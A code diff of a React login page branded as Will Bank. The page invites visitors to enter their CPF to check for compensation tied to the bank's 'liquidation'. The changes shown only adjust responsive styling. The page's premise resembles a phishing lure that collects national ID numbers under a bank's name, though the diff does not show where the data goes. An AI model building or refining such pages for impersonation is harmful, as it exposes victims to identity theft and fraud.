@@ -48,28 +48,28 @@ const Login = () => {
   };
 
   return (
-    <div className="min-h-screen bg-background flex flex-col">
+    <div className="min-h-screen min-h-[100dvh] bg-background flex flex-col">
       <WillBankHeader />
 
       {/* Main Content */}
-      <main className="flex-1 flex items-center justify-center p-4 sm:p-6">
+      <main className="flex-1 flex items-center justify-center p-3 sm:p-6">
         <WillBankCard className="w-full max-w-md">
-          <div className="space-y-8">
-            <div className="text-center space-y-3">
-              <h1 className="text-2xl sm:text-3xl font-bold text-foreground tracking-tight">
+          <div className="space-y-6">
+            <div className="text-center space-y-2">
+              <h1 className="text-xl sm:text-2xl font-bold text-foreground tracking-tight">
                 Consulte seu benefício
               </h1>
-              <p className="text-muted-foreground text-base">
+              <p className="text-muted-foreground text-sm sm:text-base">
                 Descubra se você tem direito a receber uma indenização referente à liquidação do Will Bank
               </p>
             </div>
 
-            <p className="text-sm text-center text-muted-foreground leading-relaxed">
+            <p className="text-xs sm:text-sm text-center text-muted-foreground leading-relaxed">
               Digite seu CPF para <span className="underline font-semibold text-foreground">consultar</span> se você possui benefícios disponíveis
             </p>
 
-            <div className="space-y-3">
-              <label className="text-sm font-semibold text-muted-foreground uppercase tracking-wide">CPF</label>
+            <div className="space-y-2">
+              <label className="text-xs font-semibold text-muted-foreground uppercase tracking-wide">CPF</label>
               <CPFInput 
                 value={cpf} 
                 onChange={setCpf} 
@@ -77,7 +77,7 @@ const Login = () => {
                 error={!!error}
               />
               {error && (
-                <div className="flex items-center gap-2 text-destructive text-sm bg-destructive/10 p-3 rounded-xl">
+                <div className="flex items-center gap-2 text-destructive text-xs sm:text-sm bg-destructive/10 p-2.5 rounded-xl">
                   <AlertTriangle className="w-4 h-4 shrink-0" />
                   <span>{error}</span>
                 </div>
@@ -87,7 +87,7 @@ const Login = () => {
             <Button 
               onClick={handleConsultar}
               disabled={loading || unformatCPF(cpf).length < 11}
-              className="w-full h-14 text-base font-bold bg-primary hover:bg-primary/90 text-primary-foreground rounded-full shadow-lg hover:shadow-xl transition-all duration-300 disabled:opacity-50"
+              className="w-full h-12 sm:h-14 text-sm sm:text-base font-bold bg-primary hover:bg-primary/90 text-primary-foreground rounded-full shadow-lg hover:shadow-xl transition-all duration-300 disabled:opacity-50"
             >
               {loading ? (
                 <>
@@ -100,11 +100,11 @@ const Login = () => {
             </Button>
 
             {/* Security Footer */}
-            <div className="flex items-center justify-center gap-2.5 pt-2">
+            <div className="flex items-center justify-center gap-2 pt-2">
               <div className="p-1.5 bg-primary/10 rounded-full">
-                <ShieldCheck className="w-4 h-4 text-primary" />
+                <ShieldCheck className="w-3.5 h-3.5 text-primary" />
               </div>
-              <span className="text-xs text-muted-foreground font-medium">
+              <span className="text-[11px] sm:text-xs text-muted-foreground font-medium">
                 Seus dados estão protegidos e seguros
               </span>
             </div>
